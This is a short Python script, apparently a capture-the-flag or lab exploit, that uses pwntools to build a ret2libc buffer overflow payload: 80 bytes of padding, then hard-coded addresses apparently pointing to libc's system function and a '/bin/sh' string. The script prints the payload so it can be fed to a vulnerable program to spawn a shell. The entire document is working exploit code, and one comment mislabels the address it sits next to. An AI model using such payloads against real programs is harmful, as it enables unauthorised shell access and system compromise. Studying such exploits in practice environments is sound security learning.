from pwn import *


padding = 'A'*80
syst3m = p32(0xf7e0c9e0)  # rop to ret
bin_sh = p32(0xf7dce000 + 0x17eaaa)

payload = padding + syst3m + bin_sh 

print payload
